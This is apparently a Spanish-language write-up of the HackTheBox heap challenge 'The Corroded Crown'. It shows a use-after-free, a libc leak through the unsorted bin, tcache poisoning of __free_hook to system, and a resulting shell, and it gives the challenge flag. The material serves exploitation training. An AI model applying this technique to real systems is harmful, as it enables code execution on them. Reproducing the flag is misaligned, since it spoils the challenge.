# The Corroded Crown: HackTheBox (Pwn / Heap)

**Flag:** `HTB{th3_cr0wn_h45_b33n_p01s0n3d_49402d3717df14e775e6186a208848b4}`

Remote: `154.57.164.70:31397` · glibc **2.31** (shipped)

---

## 1. Reconocimiento

Menú tipo "notes" heap:

```
1. Forge      -> forge_relic     (malloc)
2. Inscribe   -> inscribe_relic  (read into chunk)
3. Inspect    -> inspect_relic   (write chunk out)
4. Destroy    -> destroy_relic   (free)
```

Tabla global `relic[64]` en `0x4040`, entradas de 16 bytes:

```c
struct relic { void *ptr; int size; char used; };  // ptr@0, size@8, used@0xc
```

Mitigaciones: PIE, canary, NX: pero el bug lógico las esquiva. glibc 2.31
(**sin safe-linking**: los `fd` de tcache son punteros crudos).

## 2. Los bugs (UAF de lectura y escritura)

Revisando cada handler:

| Función | Comprueba `used`? | Consecuencia |
|---------|-------------------|--------------|
| `forge`    | sí (solo si vacío) | ok |
| `inscribe` | **NO** | `read(0, relic[i].ptr, relic[i].size)` sobre puntero colgante |
| `inspect`  | **NO** | `write(1, relic[i].ptr, relic[i].size)` sobre puntero colgante |
| `destroy`  | sí (`used==1`)     | `free(ptr)`; pone `used=0` **pero NO borra `ptr`** |

`destroy` libera y limpia el flag pero **deja el puntero en la tabla**. Como
`inscribe`/`inspect` no miran el flag, tras liberar un relic seguimos pudiendo:

- **leer** su contenido → `inspect` = **UAF read** (leak)
- **escribir** en él → `inscribe` = **UAF write** (tcache poisoning)

## 3. Leak de libc (unsorted bin)

Un chunk mayor que el máximo de tcache (`> 0x408`) va al **unsorted bin** al
liberarse; sus `fd`/`bk` apuntan a `main_arena+96`.

```
forge(0, 0x500)   # A
forge(1, 0x500)   # B  (guardia: evita que A se funda con el top)
destroy(0)        # A -> unsorted bin, A.fd = main_arena+96
leak = inspect(0)[:8]         # UAF read
libc_base = leak - 0x1ecbe0   # offset (main_arena+96) para esta libc 2.31
```

El offset `0x1ecbe0` se calibró una vez en local comparando el leak con
`/proc/pid/maps` (misma `libc.so.6` en remoto).

## 4. tcache poisoning → `__free_hook = system`

glibc 2.31 no tiene *safe-linking*, así que el `fd` de tcache es un puntero
crudo que podemos falsificar directamente.

```
SZ = 0x50
forge(2, SZ); forge(3, SZ)
destroy(3); destroy(2)          # tcache[0x60]: head=2 -> 3
inscribe(2, p64(__free_hook))   # UAF write: chunk2.fd = &__free_hook

forge(4, SZ)                    # saca chunk2
forge(5, SZ)                    # saca &__free_hook  -> relic[5].ptr = &__free_hook
inscribe(5, p64(system))        # __free_hook = system
```

(`tcache_get` en 2.31 no valida alineación ni tamaño, así que devolver
`&__free_hook` como "chunk" funciona aunque no esté alineado a 16.)

## 5. Disparo

```
forge(6, SZ)
inscribe(6, "/bin/sh\0")
destroy(6)          # free(chunk6) -> __free_hook(chunk6) = system("/bin/sh")
```

## 6. Resultado

```
[*] libc base : 0x7f87d25de000
[*] system    : 0x7f87d2630290
[*] __free_hook: 0x7f87d27cce48
uid=100(ctf) gid=101(ctf) groups=101(ctf)
HTB{th3_cr0wn_h45_b33n_p01s0n3d_49402d3717df14e775e6186a208848b4}
```

## Ficheros

- `challenge/corroded_crown` + `challenge/glibc/`: binario y libc del reto
- `exploit.py`: exploit pwntools (local o `remote`)
